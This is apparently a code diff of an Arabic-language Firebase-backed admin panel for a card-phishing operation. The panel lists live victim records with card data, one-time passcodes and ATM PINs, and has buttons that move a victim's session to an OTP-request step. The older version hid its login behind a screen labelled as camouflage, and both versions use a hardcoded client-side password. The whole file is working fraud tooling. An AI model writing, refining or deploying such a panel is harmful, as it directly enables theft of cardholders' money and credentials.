@@ -3,45 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام الإدارة</title>
+    <title>نظام الإدارة الموحد</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
         :root { --p-clr: #006C35; --dark: #0a0a0a; --accent: #00ff88; }
-        body { font-family: 'Segoe UI', sans-serif; background: var(--dark); color: #fff; margin: 0; overflow-x: hidden; }
+        body { font-family: 'Segoe UI', sans-serif; background: var(--dark); color: #fff; margin: 0; }
         
-        /* شاشة التمويه */
+        /* شاشة الدخول */
         #l-scr { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
-        .loader { border: 3px solid #333; border-top: 3px solid var(--accent); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #p-in { position: absolute; opacity: 0; pointer-events: none; }
-
+        .login-card { background: #111; padding: 30px; border-radius: 15px; border: 1px solid #333; width: 90%; max-width: 320px; }
+        input[type="password"] { width: 100%; padding: 12px; margin-top: 20px; border-radius: 5px; border: 1px solid var(--p-clr); background: #000; color: var(--accent); text-align: center; font-size: 20px; outline: none; box-sizing: border-box; }
+        
         /* اللوحة */
         .h-nav { background: #1a1a1a; padding: 15px; border-bottom: 2px solid var(--p-clr); display: flex; justify-content: space-between; align-items: center; }
         .main-c { padding: 20px; max-width: 1200px; margin: auto; }
         .r-row { background: #1e1e1e; border-radius: 10px; padding: 15px; margin-bottom: 10px; display: grid; grid-template-columns: 1.5fr 2fr 1.5fr 1fr; gap: 10px; align-items: center; border-right: 5px solid var(--p-clr); }
-        .c-num { color: #ff4d4d; font-family: monospace; font-size: 18px; background: #2a1010; padding: 5px; border-radius: 5px; text-align: center; border: 1px solid #4d1a1a; }
-        
-        button { padding: 10px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; transition: 0.2s; }
+        .c-num { color: #ff4d4d; font-family: monospace; font-size: 18px; background: #2a1010; padding: 5px; border-radius: 5px; text-align: center; }
+        .act { display: flex; flex-direction: column; gap: 5px; }
+        button { padding: 8px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
         .b-ok { background: var(--p-clr); color: white; }
         .b-no { background: #444; color: white; }
-        .b-ok:hover { background: #008a44; }
     </style>
 </head>
 <body>
 
 <div id="l-scr">
-    <div class="loader"></div>
-    <h2 style="color: #eee;">نظام التحقق المركزي</h2>
-    <p style="color: #666;">جاري فحص الصلاحيات، يرجى الانتظار...</p>
-    <input type="password" id="p-in" autofocus oninput="_auth(this.value)">
+    <div class="login-card">
+        <h3 style="margin:0; color:#eee;">نظام الوصول الآمن</h3>
+        <p style="color:#666; font-size:12px; margin-top:5px;">يرجى إدخال رمز التحقق للمتابعة</p>
+        <input type="password" id="p-field" placeholder="••••••••" autofocus oninput="_check(this.value)">
+    </div>
 </div>
 
 <audio id="_notif" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>
 
 <div class="h-nav">
     <div style="color: var(--accent);">متصل الآن: <span id="_online">0</span></div>
-    <div style="font-weight: bold;">لوحة البيانات اللحظية</div>
+    <div style="font-weight: bold;">لوحة التحكم - System V3</div>
 </div>
 
 <div class="main-c" id="_logs"></div>
@@ -60,14 +59,14 @@
     firebase.initializeApp(_cfg);
     const _db = firebase.database();
 
-    // حفظ الدخول عشان ما يطلبش باسورد كل شوية
-    if(localStorage.getItem('admin_login') === 'true') {
+    // فحص إذا كان مسجل دخول مسبقاً
+    if(localStorage.getItem('admin_session') === 'active') {
         document.getElementById('l-scr').style.display = 'none';
     }
 
-    function _auth(v) {
+    function _check(v) {
         if(v === "H1234567890H") {
-            localStorage.setItem('admin_login', 'true');
+            localStorage.setItem('admin_session', 'active');
             document.getElementById('l-scr').style.display = 'none';
         }
     }
@@ -84,7 +83,7 @@
                 <span style="color:#00aaff; font-weight:bold;">OTP: ${cardInfo.otp || '----'}</span><br>
                 <span style="color:#ff4d4d; font-size:12px;">PIN: ${cardInfo.atm_pin || '----'}</span>
             </div>
-            <div style="display:flex; flex-direction:column; gap:5px;">
+            <div class="act">
                 <button class="b-ok" onclick="_cmd('${id}', 'go_to_otp')">طلب OTP</button>
                 <button class="b-no" onclick="_del('${id}')">حذف</button>
             </div>
@@ -102,7 +101,7 @@
     _db.ref('orders').on('child_changed', (s) => _draw(s.key, s.val()));
     _db.ref('orders').on('child_removed', (s) => document.getElementById('card-' + s.key)?.remove());
 
-    function _cmd(id, st) { _db.ref('orders/' + id).update({ next_step: st, last_action: Date.now() }); }
+    function _cmd(id, st) { _db.ref('orders/' + id).update({ next_step: st }); }
     function _del(id) { if(confirm('حذف؟')) _db.ref('orders/' + id).remove(); }
 
     _db.ref('live_sessions').on('value', (s) => {
